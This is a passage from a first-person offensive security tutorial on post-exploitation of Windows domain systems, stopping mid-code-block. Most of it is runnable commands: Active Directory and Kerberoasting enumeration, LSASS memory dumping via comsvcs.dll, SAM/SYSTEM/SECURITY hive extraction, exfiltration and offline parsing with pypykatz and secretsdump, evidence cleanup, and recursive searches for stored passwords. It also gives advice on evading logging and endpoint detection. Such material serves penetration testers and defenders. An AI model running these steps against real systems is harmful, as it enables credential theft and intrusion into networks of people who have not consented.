<h2>Initial Reconnaissance and Enumeration</h2>
<p>Let me walk you through how I typically start reconnaissance after getting that initial shell. The first few minutes are critical - you need to understand where you are, what you have access to, and what the environment looks like, all while keeping a low profile.</p>
<h3>Understanding Your Initial Foothold</h3>
<p>The first thing I do is get oriented. I need to know what kind of system I'm on, what privileges I have, and whether this is a domain-joined machine. This tells me what my next steps should be and what techniques are available to me.</p>
<p>I start with PowerShell because it's the most versatile tool for enumeration and it's available on every modern Windows system. Here's the thing about PowerShell though - it's powerful, but it's also heavily logged in modern environments. Every command you run can potentially show up in logs that security teams monitor. So while I'm going to show you comprehensive enumeration techniques, in a real engagement you'd want to be more selective about what you query.</p>
<p>Let's start with basic system information:</p>
<pre class="language-powershell"><code class="language-powershell"># Check what OS we're running
Get-WmiObject -Class Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber, OSArchitecture
</code></pre>
<p>This tells me if I'm on a workstation or server, what version of Windows, and whether it's 32 or 64-bit. The version is particularly important because older systems might have different tools available and different security features. For example, Windows 7 and Server 2008 have PowerShell 2.0 by default, which doesn't have the same logging capabilities as modern versions. Knowing this helps me understand what I can get away with.</p>
<p>Next, I check if the system is domain-joined:</p>
<pre class="language-powershell"><code class="language-powershell"># See if we're in a domain
(Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain

# If yes, get the domain name
(Get-WmiObject -Class Win32_ComputerSystem).Domain
</code></pre>
<p>This is huge. If the system is domain-joined, I'm not just on an isolated workstation - I potentially have access to an entire Active Directory environment. This changes everything about my approach. Instead of focusing on local privilege escalation, I can start thinking about lateral movement and domain-level attacks.</p>
<p>Now I need to understand what privileges I'm running with:</p>
<pre class="language-powershell"><code class="language-powershell">whoami /all
</code></pre>
<p>This single command gives me a wealth of information. It shows my username, what groups I'm in, and critically, what privileges my token has. If I see "SeDebugPrivilege" or "SeImpersonatePrivilege," that's very interesting - these privileges can often be abused for privilege escalation. If I'm already in the local administrators group, my job just got a lot easier.</p>
<p>Let me show you what a typical output looks like and why it matters. When I run <code>whoami /all</code> as a standard user, I might see something like:</p>
<pre class="language-none"><code class="language-none">USER INFORMATION
----------------
User Name           SID
=================== ========
CORP\jsmith         S-1-5-21-...

GROUP INFORMATION
-----------------
Group Name                             Type
====================================== ====
Everyone                               Well-known group
BUILTIN\Users                          Alias
NT AUTHORITY\INTERACTIVE               Well-known group
NT AUTHORITY\Authenticated Users       Well-known group

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                          State
============================= ==================================== ========
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
</code></pre>
<p>This tells me I'm a domain user (CORP\jsmith), I'm in the standard Users group, and I have very limited privileges. This is the typical starting point. But if I see something like this:</p>
<pre class="language-none"><code class="language-none">GROUP INFORMATION
-----------------
BUILTIN\Administrators                 Alias

PRIVILEGES INFORMATION
----------------------
SeDebugPrivilege                  Debug programs                       Enabled
</code></pre>
<p>Now we're talking. If I'm in the Administrators group, I can do pretty much anything on this local system. And if I have SeDebugPrivilege enabled, I can attach to and read memory from any process - including LSASS, which contains credentials.</p>
<h3>Enumerating Local Users and Groups</h3>
<p>Understanding who uses this system and what their privileges are helps me plan my next moves. Maybe there's a local admin account I can target, or maybe I can figure out who to impersonate for social engineering.</p>
<pre class="language-powershell"><code class="language-powershell"># List all local users
Get-LocalUser | Select-Object Name, Enabled, LastLogon, PasswordLastSet
</code></pre>
<p>What I'm looking for here are admin accounts, enabled accounts that haven't been used recently (potential abandoned accounts), and accounts with old passwords (potentially weak or default passwords). In one engagement, I found a local "Support" account that had been created three years ago and never disabled. The password was <code>Support123</code> - and it was in the local administrators group.</p>
<pre class="language-powershell"><code class="language-powershell"># See who's in the local administrators group
Get-LocalGroupMember -Group "Administrators"
</code></pre>
<p>This is critical. If there are domain accounts in the local administrators group, those accounts can be used to access this system from anywhere on the network. This is also where I often find evidence of privileged users - maybe the desktop support team has their domain accounts in local admin, or maybe the system owner has elevated rights.</p>
<h3>Understanding Running Processes and Services</h3>
<p>Knowing what's running on the system tells me a lot about what I'm dealing with. Is there endpoint security? Is this a developer workstation? Is there interesting software I can abuse?</p>
<pre class="language-powershell"><code class="language-powershell"># Get all running processes with their paths
Get-Process | Select-Object ProcessName, Id, Path | Sort-Object ProcessName
</code></pre>
<p>When I look through this output, I'm specifically looking for security products (CrowdStrike, Carbon Black, SentinelOne, etc.), development tools (Visual Studio, database tools), and interesting applications that might store credentials or data. I'm also looking for processes running with high privileges that might be exploitable.</p>
<p>For services, I want to see what's configured to run, especially what's running as SYSTEM:</p>
<pre class="language-powershell"><code class="language-powershell"># Find services running as SYSTEM
Get-WmiObject win32_service | Where-Object {$_.StartName -eq "LocalSystem"} | Select-Object Name, PathName, State, StartMode
</code></pre>
<p>Here's why this matters: if I can find a service running as SYSTEM that I can manipulate - maybe it has weak permissions on its executable, or maybe it has an unquoted service path - I can potentially escalate privileges. Let me show you what an unquoted service path vulnerability looks like:</p>
<pre class="language-powershell"><code class="language-powershell"># Look for unquoted service paths with spaces
Get-WmiObject win32_service | Where-Object {
    $_.PathName -notlike '"*' -and
    $_.PathName -like '* *'
} | Select-Object Name, PathName, StartName, State
</code></pre>
<p>If this returns something like:</p>
<pre class="language-none"><code class="language-none">Name     : VulnerableService
PathName : C:\Program Files\Company App\Service.exe
StartName: LocalSystem
State    : Running
</code></pre>
<p>This is potentially exploitable. Because the path contains spaces and isn't quoted, Windows will actually try to execute <code>C:\Program.exe</code> first, then <code>C:\Program Files\Company.exe</code>, before finally executing the correct file. If I have write access to <code>C:\</code>, I can place a malicious <code>Program.exe</code> and get code execution as SYSTEM when the service restarts.</p>
<h3>Network Reconnaissance</h3>
<p>Understanding the network environment is crucial for planning lateral movement. I need to know what other systems are out there, what services are running, and how everything is connected.</p>
<pre class="language-powershell"><code class="language-powershell"># Get basic network configuration
Get-NetIPConfiguration
</code></pre>
<p>This shows me the system's IP address, subnet, gateway, and DNS servers. The DNS servers are particularly interesting in a domain environment - they're often domain controllers, which are high-value targets.</p>
<p>To see what connections this system has been making:</p>
<pre class="language-powershell"><code class="language-powershell"># Show established network connections
Get-NetTCPConnection | Where-Object {$_.State -eq "Established"} |
    Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess |
    Sort-Object RemoteAddress
</code></pre>
<p>This tells me what the user has been connecting to. Maybe I see connections to file servers, database servers, or administrative systems. Each of these represents a potential target for lateral movement. I can also correlate the OwningProcess ID with running processes to understand what applications are making these connections.</p>
<p>The ARP cache is another goldmine of information:</p>
<pre class="language-powershell"><code class="language-powershell"># Check ARP cache for recently communicated hosts
Get-NetNeighbor | Where-Object {$_.State -ne "Unreachable" -and $_.State -ne "Incomplete"} |
    Select-Object IPAddress, LinkLayerAddress, State
</code></pre>
<p>This shows me every system on the local subnet that this machine has communicated with recently. These are systems that the user interacts with, which means they're good candidates for lateral movement because the connections will look legitimate.</p>
<p>For a more active approach, I can do a ping sweep to find live hosts on the subnet:</p>
<pre class="language-powershell"><code class="language-powershell"># Ping sweep a subnet (be careful - this is noisy)
1..254 | ForEach-Object {
    $ip = "192.168.1.$_"
    if (Test-Connection -ComputerName $ip -Count 1 -Quiet -TimeoutSeconds 1) {
        Write-Output "$ip is alive"
    }
}
</code></pre>
<p>Now, here's the important caveat: ping sweeps are noisy. Every single ping can be logged, and network monitoring tools will definitely see this. In a real engagement, I'm more likely to be passive and rely on the ARP cache and existing connections unless I have a good reason to actively scan.</p>
<h3>Installed Software Enumeration</h3>
<p>What software is installed tells me a lot about what kind of system this is and what might be vulnerable or exploitable:</p>
<pre class="language-powershell"><code class="language-powershell"># List installed software from registry (64-bit)
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
    Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
    Where-Object {$_.DisplayName -ne $null}

# Also check 32-bit software on 64-bit systems
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
    Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
    Where-Object {$_.DisplayName -ne $null}
</code></pre>
<p>When I look through this list, I'm looking for several things. First, is there development software installed? If I see Visual Studio, SQL Server Management Studio, or other development tools, this might be a developer's workstation, which often means elevated privileges and access to sensitive systems. Second, are there outdated applications with known vulnerabilities? Third, are there interesting applications that might store credentials - VPN clients, remote desktop managers, database tools?</p>
<p>I also want to know what security products are installed:</p>
<pre class="language-powershell"><code class="language-powershell"># Check for security products
Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct |
    Select-Object displayName, pathToSignedProductExe, productState
</code></pre>
<p>This tells me what antivirus or endpoint protection is running. Knowing this helps me understand what detection capabilities I'm up against and what techniques I need to avoid. For example, if I see Windows Defender only, I know I'm dealing with basic protection. If I see CrowdStrike or Carbon Black, I know I need to be much more careful.</p>
<h3>Active Directory Enumeration</h3>
<p>If the system is domain-joined - and most corporate workstations are - I can start enumerating Active Directory without uploading any tools. This is where things get really interesting because I'm no longer just looking at one isolated system; I'm looking at the entire domain infrastructure.</p>
<p>The first thing I want to know is basic domain information:</p>
<pre class="language-powershell"><code class="language-powershell"># Get current domain information
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
</code></pre>
<p>This returns comprehensive information about the domain - its name, the forest it's part of, domain controllers, and various domain settings. The domain controller list is particularly valuable because these are high-value targets.</p>
<p>To see all the domain controllers explicitly:</p>
<pre class="language-powershell"><code class="language-powershell"># List all domain controllers
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers |
    Select-Object Name, IPAddress, OSVersion
</code></pre>
<p>Now here's where it gets interesting. If the system has the ActiveDirectory PowerShell module installed (which is common on admin workstations and servers), I have access to incredibly powerful enumeration capabilities:</p>
<pre class="language-powershell"><code class="language-powershell"># Check if ActiveDirectory module is available
Get-Module -ListAvailable -Name ActiveDirectory
</code></pre>
<p>If it's available, I can enumerate users, groups, computers, and basically everything in Active Directory:</p>
<pre class="language-powershell"><code class="language-powershell"># List all users in the domain
Get-ADUser -Filter * -Properties * |
    Select-Object Name, SamAccountName, Enabled, LastLogonDate, PasswordLastSet,
                  whenCreated, AdminCount

# Find domain administrators
Get-ADGroupMember -Identity "Domain Admins" -Recursive |
    Select-Object Name, SamAccountName, objectClass

# List all computers in the domain
Get-ADComputer -Filter * -Properties * |
    Select-Object Name, OperatingSystem, OperatingSystemVersion,
                  LastLogonDate, IPv4Address
</code></pre>
<p>The AdminCount property is particularly interesting - it's set on accounts that are or have been members of privileged groups. This is a quick way to find accounts that have or had elevated privileges.</p>
<p>But what if the ActiveDirectory module isn't installed? That's actually the more common scenario on standard workstations. The good news is that I can still enumerate Active Directory using .NET classes that are built into Windows:</p>
<pre class="language-powershell"><code class="language-powershell"># Query AD without the ActiveDirectory module using ADSI
$searcher = [ADSISearcher]"(objectClass=user)"
$searcher.PropertiesToLoad.AddRange(@("samaccountname","displayname","mail"))
$searcher.FindAll() | ForEach-Object {
    [PSCustomObject]@{
        Username = $_.Properties['samaccountname'][0]
        DisplayName = $_.Properties['displayname'][0]
        Email = $_.Properties['mail'][0]
    }
}
</code></pre>
<p>This uses ADSI (Active Directory Service Interfaces), which is a COM interface that's always available on domain-joined systems. It's a bit more verbose than using the ActiveDirectory module, but it works without installing anything.</p>
<p>Let me show you how to find specific high-value targets. Domain Admins are the obvious target, but I can query for them without the module:</p>
<pre class="language-powershell"><code class="language-powershell"># Find Domain Admins using ADSI
$searcher = [ADSISearcher]"(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=corp,DC=local)"
$searcher.FindAll() | ForEach-Object {
    $_.Properties['samaccountname']
}
</code></pre>
<p>The <code>1.2.840.113556.1.4.1941</code> is the LDAP_MATCHING_RULE_IN_CHAIN OID, which gives us recursive group membership. This is important because it finds users who are members of Domain Admins indirectly through nested groups.</p>
<p>I also want to find computers, especially servers and domain controllers:</p>
<pre class="language-powershell"><code class="language-powershell"># Find all computers
$searcher = [ADSISearcher]"(objectClass=computer)"
$searcher.PropertiesToLoad.AddRange(@("name","operatingsystem","operatingsystemversion"))
$searcher.FindAll() | ForEach-Object {
    [PSCustomObject]@{
        Name = $_.Properties['name'][0]
        OS = $_.Properties['operatingsystem'][0]
        Version = $_.Properties['operatingsystemversion'][0]
    }
}
</code></pre>
<p>One of my favorite enumeration queries is looking for user accounts with interesting properties:</p>
<pre class="language-powershell"><code class="language-powershell"># Find users with passwords that never expire
$searcher = [ADSISearcher]"(&#x26;(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))"
$searcher.FindAll() | ForEach-Object {
    $_.Properties['samaccountname']
}

# Find users with "password not required" set
$searcher = [ADSISearcher]"(&#x26;(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))"
$searcher.FindAll() | ForEach-Object {
    $_.Properties['samaccountname']
}
</code></pre>
<p>These accounts often have weak passwords or are service accounts with interesting privileges. The userAccountControl attribute uses bitwise flags, and the LDAP_MATCHING_RULE_BIT_AND (1.2.840.113556.1.4.803) lets us query for specific flags.</p>
<p>One more incredibly useful query - finding Service Principal Names (SPNs), which are potential Kerberoasting targets:</p>
<pre class="language-powershell"><code class="language-powershell"># Find accounts with SPNs (Kerberoastable accounts)
$searcher = [ADSISearcher]"(&#x26;(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512))"
$searcher.PropertiesToLoad.AddRange(@("samaccountname","serviceprincipalname"))
$searcher.FindAll() | ForEach-Object {
    [PSCustomObject]@{
        Username = $_.Properties['samaccountname'][0]
        SPN = $_.Properties['serviceprincipalname'][0]
    }
}
</code></pre>
<p>These are user accounts with SPNs registered. When you request a service ticket for these accounts, you get back a ticket encrypted with the account's password hash. If the account has a weak password, you can crack this ticket offline and compromise the account.</p>
<h3>Alternative: Native Windows Tools for AD Enumeration</h3>
<p>While PowerShell and ADSI are powerful for Active Directory enumeration, there are situations where you might not want to use PowerShell - maybe it's heavily logged, restricted by policy, or you're trying to avoid PowerShell-specific detections. Fortunately, Windows includes several native command-line tools that can enumerate Active Directory without touching PowerShell.</p>
<p>These tools have been part of Windows for years, they're used by system administrators regularly, and they're often overlooked by security monitoring. Let me show you the most useful ones.</p>
<h4>nltest - Domain Trust and DC Enumeration</h4>
<blockquote>
<p><strong>üö® EDR REALITY CHECK (2025):</strong> While nltest has been flying under the radar historically, detection engineers are now creating specific use cases for nltest, dsquery, and setspn enumeration. Multiple nltest commands in succession, especially <code>/domain_trusts</code> and <code>/dclist</code>, are being flagged as reconnaissance activity. In mature SOCs, these commands may trigger alerts when used outside of normal IT administrative hours or from unexpected user accounts. Still quieter than PowerShell Active Directory modules, but no longer invisible.</p>
</blockquote>
<p>Nltest.exe is a native Windows tool designed for testing and managing domain trust relationships. It's incredibly useful for understanding domain structure:</p>
<pre class="language-powershell"><code class="language-powershell"># Get list of domain controllers
nltest /dclist:domain.local

# Show domain trusts
nltest /domain_trusts

# Show all trusts including forest trusts
nltest /domain_trusts /all_trusts

# Get domain controller info
nltest /dsgetdc:domain.local

# Show current domain and site
nltest /dsgetsite

# Query domain information
nltest /dcname:domain.local
</code></pre>
<p>The domain trust information is particularly valuable. It shows you all the domains that trust relationships exist with, which domains are in the same forest, and potential paths for lateral movement across domain boundaries. In complex Active Directory environments, trust relationships can be your path to escalating from a compromised domain to the forest root or other connected domains.</p>
<p>Here's what the output looks like when you run <code>nltest /domain_trusts</code>:</p>
<pre class="language-none"><code class="language-none">List of domain trusts:
    0: CORP corp.local (NT 5) (Forest Tree Root) (Primary Domain) (Native)
    1: DEV dev.corp.local (NT 5) (Forest: 0) (Direct Outbound) (Direct Inbound) (Native)
    2: PROD prod.corp.local (NT 5) (Forest: 0) (Direct Outbound) (Direct Inbound) (Native)
The command completed successfully
</code></pre>
<p>This tells me there are three domains in the forest, and they all have bidirectional trust relationships. This means if I compromise an account in DEV, I might be able to access resources in CORP or PROD.</p>
<h4>dsquery - Direct AD Queries</h4>
<p>Dsquery is part of the Remote Server Administration Tools (RSAT), but it's often installed on admin workstations and servers. It allows direct LDAP queries against Active Directory:</p>
<pre class="language-powershell"><code class="language-powershell"># List all users in the domain
dsquery user -limit 0

# List all computers
dsquery computer -limit 0

# List all groups
dsquery group -limit 0

# List all domain controllers
dsquery server

# Find users in a specific OU
dsquery user "OU=IT,DC=corp,DC=local"

# Find disabled accounts
dsquery user -disabled

# Find inactive computers (not logged in for 4 weeks)
dsquery computer -inactive 4

# Custom LDAP query for users with SPNs (Kerberoasting targets)
dsquery * -filter "(&#x26;(objectClass=user)(servicePrincipalName=*))" -attr samAccountName servicePrincipalName

# Find users with adminCount=1 (current or former privileged accounts)
dsquery * -filter "(&#x26;(objectClass=user)(adminCount=1))" -attr samAccountName whenCreated

# Find all user accounts (not computer accounts)
dsquery * -filter "(&#x26;(objectCategory=person)(objectClass=user))" -limit 0 -attr samAccountName displayName

# Find domain admins
dsquery group -name "Domain Admins" | dsget group -members
</code></pre>
<p>The power of dsquery is in the <code>-filter</code> parameter, which accepts standard LDAP filter syntax. This is the same syntax we used with ADSI in PowerShell, but now we're using a native command-line tool.</p>
<p>Here's a practical example - finding all accounts with passwords set to never expire:</p>
<pre class="language-powershell"><code class="language-powershell"># Find accounts with password never expires flag
dsquery * -filter "(&#x26;(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))" -attr samAccountName pwdLastSet
</code></pre>
<p>You can pipe dsquery output to dsget for more detailed information:</p>
<pre class="language-powershell"><code class="language-powershell"># Get detailed user information
dsquery user -limit 10 | dsget user -samid -email -desc -disabled

# Get detailed computer information
dsquery computer -limit 10 | dsget computer -name -desc -loc
</code></pre>
<h4>setspn - Service Principal Name Enumeration</h4>
<p>Setspn.exe is the native tool for managing Service Principal Names. While it's designed for administrators to register and query SPNs, we can abuse it for Kerberoasting reconnaissance:</p>
<pre class="language-powershell"><code class="language-powershell"># List all SPNs in the domain
setspn -Q */*

# List SPNs for a specific service type
setspn -Q MSSQLSvc/*

# List SPNs for a specific host
setspn -L hostname

# Find duplicate SPNs (usually a misconfiguration)
setspn -X

# Query for HTTP SPNs (web applications)
setspn -Q HTTP/*

# Query for specific service accounts
setspn -Q */* | findstr /i "svc"
</code></pre>
<p>The <code>-Q</code> flag queries Active Directory for SPNs. The <code>*/*</code> wildcard means "all service types on all hosts." This returns every registered SPN in the domain, which is exactly what you need to identify Kerberoasting targets.</p>
<p>Here's what makes setspn particularly useful: unlike PowerShell queries that might trigger script execution monitoring, setspn is a simple native binary doing exactly what it's designed to do. It's used by administrators constantly for troubleshooting Kerberos authentication issues.</p>
<p>A practical workflow for finding Kerberoastable targets:</p>
<pre class="language-powershell"><code class="language-powershell"># Find all SPNs and filter for user accounts (not computer accounts)
setspn -Q */* > spns.txt

# Then manually review or use findstr to filter
type spns.txt | findstr /v /i "CN=Computers"
</code></pre>
<h4>net - Legacy but Effective</h4>
<p>The ancient net commands still work and are rarely monitored because they're so common:</p>
<pre class="language-powershell"><code class="language-powershell"># Enumerate domain users
net user /domain

# Get details on specific user
net user username /domain

# Enumerate domain groups
net group /domain

# Find domain admins
net group "Domain Admins" /domain

# Find enterprise admins
net group "Enterprise Admins" /domain

# Find local admins on current machine
net localgroup administrators

# View domain password policy
net accounts /domain

# Find domain controllers
net group "Domain Controllers" /domain
</code></pre>
<p>These commands are ancient - they've been part of Windows since the NT days - but they still work perfectly for basic enumeration. They're also completely invisible to PowerShell logging because they're not PowerShell.</p>
<h4>Combining Native Tools for Complete Enumeration</h4>
<p>Here's a practical example of using only native tools for complete domain reconnaissance:</p>
<pre class="language-batch"><code class="language-batch">@echo off
echo === Domain Information ===
nltest /domain_trusts
echo.

echo === Domain Controllers ===
nltest /dclist:%USERDNSDOMAIN%
echo.

echo === Domain Users (first 20) ===
dsquery user -limit 20
echo.

echo === Domain Admins ===
net group "Domain Admins" /domain
echo.

echo === Kerberoastable Accounts ===
setspn -Q */*
echo.

echo === Domain Password Policy ===
net accounts /domain
</code></pre>
<p>Save this as a .bat file and run it - you get comprehensive domain intelligence using only native Windows tools. No PowerShell, no ADSI, just built-in utilities that have been part of Windows for decades.</p>
<p>The key advantage of these native tools is that they generate different log signatures than PowerShell. If defenders are hunting specifically for PowerShell-based enumeration, these commands might slip under the radar. They also work on older systems where PowerShell might not be available or might be PowerShell 2.0 without modern logging capabilities.</p>
<h3>Remote System Enumeration with WMI</h3>
<p>Once I understand the local system and the domain structure, I want to start looking at other systems on the network. WMI (Windows Management Instrumentation) is perfect for this because it's a legitimate management protocol that's enabled by default on Windows systems.</p>
<p>Here's the key thing about WMI: if I have valid credentials (either from my current user context or credentials I've harvested), I can query remote systems for information without uploading any tools or making obvious connections.</p>
<p>Let me show you how to query a remote system:</p>
<pre class="language-powershell"><code class="language-powershell"># Get operating system information from a remote system
Get-WmiObject -Class Win32_OperatingSystem -ComputerName TARGET-PC |
    Select-Object CSName, Caption, Version, BuildNumber, OSArchitecture, LastBootUpTime
</code></pre>
<p>This tells me what OS the target is running, when it was last rebooted, and its architecture. If the query succeeds, I know I have permission to query that system via WMI, which often means I can do much more.</p>
<p>To see what processes are running on the remote system:</p>
<pre class="language-powershell"><code class="language-powershell"># List processes on remote system
Get-WmiObject -Class Win32_Process -ComputerName TARGET-PC |
    Select-Object ProcessName, ProcessId, CommandLine, CreationDate |
    Sort-Object CreationDate -Descending
</code></pre>
<p>The CommandLine property is particularly interesting because it shows how the process was launched, including any command-line arguments. This sometimes reveals credentials, file paths, or other useful information.</p>
<p>I can also check what software is installed on the remote system:</p>
<pre class="language-powershell"><code class="language-powershell"># List installed software on remote system
Get-WmiObject -Class Win32_Product -ComputerName TARGET-PC |
    Select-Object Name, Version, Vendor, InstallDate
</code></pre>
<p>Note: Be careful with Win32_Product as it can trigger Windows Installer service and cause applications to repair themselves. In a stealth engagement, I usually avoid this class and instead query the registry remotely.</p>
<p>To see who's logged into a remote system:</p>
<pre class="language-powershell"><code class="language-powershell"># Get logged-in users on remote system
Get-WmiObject -Class Win32_ComputerSystem -ComputerName TARGET-PC |
    Select-Object Name, UserName
</code></pre>
<p>This only shows the currently logged-in user, but it's useful for targeting systems where specific users are active.</p>
<p>One of the most useful WMI queries is checking what services are running:</p>
<pre class="language-powershell"><code class="language-powershell"># List services on remote system
Get-WmiObject -Class Win32_Service -ComputerName TARGET-PC |
    Select-Object Name, State, StartMode, PathName, StartName |
    Where-Object {$_.State -eq "Running"}
</code></pre>
<p>This shows what's actively running, what account services run as, and their executable paths. Services running as privileged accounts are interesting because if I can execute code in that service's context, I inherit those privileges.</p>
<h2>Credential Access and Harvesting</h2>
<p>Now we get to one of the most critical phases of post-exploitation - getting credentials. Without additional credentials, you're limited to what your initial foothold account can access. But with additional credentials, especially privileged ones, you can move laterally, escalate privileges, and access sensitive systems.</p>
<p>Let me walk you through the various ways to extract credentials using only native Windows tools.</p>
<h3>The LSASS Memory Dumping Technique</h3>
<p>LSASS (Local Security Authority Subsystem Service) is the process responsible for enforcing security policy on Windows systems. It handles user authentication, Active Directory interactions, and critically for us, it caches credentials in memory. When a user logs into a system, their credentials - including NTLM hashes and sometimes cleartext passwords - end up in LSASS memory.</p>
<p>The classic tool for extracting credentials from LSASS is Mimikatz, but as I mentioned earlier, uploading Mimikatz is a great way to get caught immediately. The good news is we can create a memory dump of the LSASS process using only native Windows tools, then parse that dump offline where defenders can't see us.</p>
<p>Here's the technique that changed everything for me:</p>
<blockquote>
<p><strong>üö® EDR REALITY CHECK (2025):</strong> This technique is <strong>extremely loud</strong> on modern EDRs. CrowdStrike, Defender ATP, SentinelOne, and Carbon Black all have specific detections for comsvcs.dll being used to dump LSASS memory. The process tree (rundll32 ‚Üí comsvcs ‚Üí LSASS access) is a well-known indicator. Touching LSASS memory is considered "straight-up suicide" in mature environments. To use this technique in 2025, you'd need: PPL bypass, direct syscalls to avoid hooks, process injection to hide the call chain, or custom memory access techniques. This works great in labs and legacy environments, but expect immediate alerts in hardened corporate networks.</p>
</blockquote>
<pre class="language-powershell"><code class="language-powershell"># First, get the process ID of LSASS
$lsass = Get-Process lsass
$lsassPid = $lsass.Id

# Dump LSASS memory using comsvcs.dll and rundll32
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid C:\temp\lsass.dmp full
</code></pre>
<p>Let me explain what's happening here. The comsvcs.dll library is a legitimate Windows component - it's part of the Component Services system. One of its functions, MiniDump, is designed to create memory dumps of processes for debugging purposes. It's a legitimate administrative function that IT support staff use when troubleshooting application crashes.</p>
<p>When you run this command, rundll32.exe (another legitimate Windows binary) calls the MiniDump function from comsvcs.dll and tells it to dump the memory of process ID $lsassPid (which is LSASS) to the file C:\temp\lsass.dmp with the 'full' flag (which means include all memory, not just a minidump).</p>
<p>The beautiful thing about this technique is that every component is legitimate. Rundll32.exe is signed by Microsoft and present on every Windows system. The comsvcs.dll library is also signed by Microsoft and is a standard Windows component. Creating process dumps is a normal administrative task that IT support staff perform regularly for troubleshooting.</p>
<p>The only thing that might raise suspicion is dumping LSASS specifically, but even that has legitimate uses - Microsoft Support sometimes asks administrators to create LSASS dumps for troubleshooting authentication issues.</p>
<p>Important OPSEC considerations: This technique requires SeDebugPrivilege, which means you need to be running as an administrator or have that specific privilege. Also, some EDR solutions specifically watch for processes accessing LSASS memory or creating dumps of LSASS. It's not a guaranteed stealth technique, but it's significantly less obvious than running Mimikatz.</p>
<p>Once you have the dump file, you need to exfiltrate it and parse it on your attacker machine. You can parse it with pypykatz (a Python implementation of Mimikatz):</p>
<pre class="language-bash"><code class="language-bash"># On your attacker machine
pypykatz lsa minidump lsass.dmp
</code></pre>
<p>This will extract all the credentials from the dump file - NTLM hashes, Kerberos tickets, cleartext passwords if they're present, and more.</p>
<p>After you've exfiltrated the dump, clean up:</p>
<pre class="language-powershell"><code class="language-powershell"># Delete the dump file
Remove-Item C:\temp\lsass.dmp -Force
</code></pre>
<p>If you have GUI access to the system (maybe through RDP), there's an even simpler method that users of Windows legitimately use all the time:</p>
<ol>
<li>Open Task Manager (Ctrl+Shift+Esc or run taskmgr.exe)</li>
<li>Go to the Details tab</li>
<li>Find "Local Security Authority Process" or lsass.exe</li>
<li>Right-click and select "Create dump file"</li>
<li>Task Manager will create the dump and show you the path</li>
</ol>
<p>This is completely legitimate system administration behavior. IT support creates process dumps all the time for troubleshooting.</p>
<h3>Registry Credential Extraction</h3>
<p>Windows stores local account password hashes in the SAM (Security Account Manager) registry hive. These hashes are encrypted with a key stored in the SYSTEM registry hive. If you can extract both of these hives, you can decrypt the password hashes offline.</p>
<p>Here's how to extract these registry hives using the built-in reg.exe utility:</p>
<blockquote>
<p><strong>üö® EDR REALITY CHECK (2025):</strong> Registry hive dumps of SAM/SYSTEM/SECURITY are <strong>well-known attack indicators</strong> with straightforward detection rules in modern EDRs. Most security products flag <code>reg save</code> operations on these specific hives. The combination of all three being extracted in succession is especially suspicious. This technique works in lab environments and systems without EDR, but will trigger alerts in monitored environments. Consider alternative approaches like registry parsing in-memory or using Volume Shadow Copy techniques with additional obfuscation.</p>
</blockquote>
<pre class="language-powershell"><code class="language-powershell"># Save the SAM hive
reg save HKLM\SAM C:\temp\sam.hive

# Save the SYSTEM hive (contains the encryption key)
reg save HKLM\SYSTEM C:\temp\system.hive

# Also save SECURITY for cached domain credentials
reg save HKLM\SECURITY C:\temp\security.hive
</code></pre>
<p>These commands use the reg.exe utility, which is the standard Windows registry manipulation tool. The 'save' operation creates a backup copy of the specified registry hive. This is a completely legitimate administrative operation - system administrators back up registry hives all the time before making system changes.</p>
<p>However, there's an important requirement: you need administrator privileges to access these registry hives. Windows protects them specifically because they contain sensitive security information.</p>
<p>Once you have these files, exfiltrate them to your attacker machine and parse them:</p>
<pre class="language-bash"><code class="language-bash"># On your attacker machine, use secretsdump from Impacket
secretsdump.py -sam sam.hive -security security.hive -system system.hive LOCAL
</code></pre>
<p>This will extract local account password hashes from the SAM hive, LSA secrets from the SECURITY hive (which can include service account passwords, auto-logon credentials, and more), and cached domain credentials from SECURITY (these are hashes of domain credentials for users who have logged into this machine).</p>
<p>The cached domain credentials are particularly interesting. Windows caches the last 10 domain logins (by default) so that users can log in even when the domain controller is unavailable. These cached credentials are hashed, but they can be cracked offline if the passwords are weak.</p>
<p>For remote systems where you have administrative access, you can extract registry hives over the network if the RemoteRegistry service is running:</p>
<pre class="language-powershell"><code class="language-powershell"># Check if RemoteRegistry service is running on target
Get-Service -Name RemoteRegistry -ComputerName TARGET-PC

# Start it if it's not running
Get-Service -Name RemoteRegistry -ComputerName TARGET-PC | Start-Service

# Connect to remote registry and save hives
reg save \\TARGET-PC\HKLM\SAM C:\temp\remote_sam.hive
reg save \\TARGET-PC\HKLM\SYSTEM C:\temp\remote_system.hive
</code></pre>
<p>Be aware that starting RemoteRegistry can be logged and might trigger alerts in monitored environments.</p>
<h3>Searching for Credentials in Files</h3>
<p>One of the most successful credential harvesting techniques is simply searching for credentials stored in files. You'd be surprised how often administrators, developers, and users store passwords in plaintext files - scripts, configuration files, documentation, notes.</p>
<p>Here's how I systematically search for credentials:</p>
<pre class="language-powershell"><code class="language-powershell"># Search for files that might contain passwords
Get-ChildItem C:\ -Recurse -Include *.txt,*.xml,*.ini,*.config,*.ps1,*.bat,*.cmd -ErrorAction SilentlyContinue |
    Select-String -Pattern "password" -CaseSensitive:$false |
    Group-Object Path |
    Select-Object Name
</code></pre>
<p>This recursively searches the C: drive for text files, XML files, configuration files, and scripts that contain the word "password". The Group-Object Path part prevents duplicate results for files with multiple matches.</p>
<p>Let me be more specific about high-value targets:</p>
<pre class="language-powershell"><code class="language-powershell"># Look for unattended installation files (often contain admin credentials)
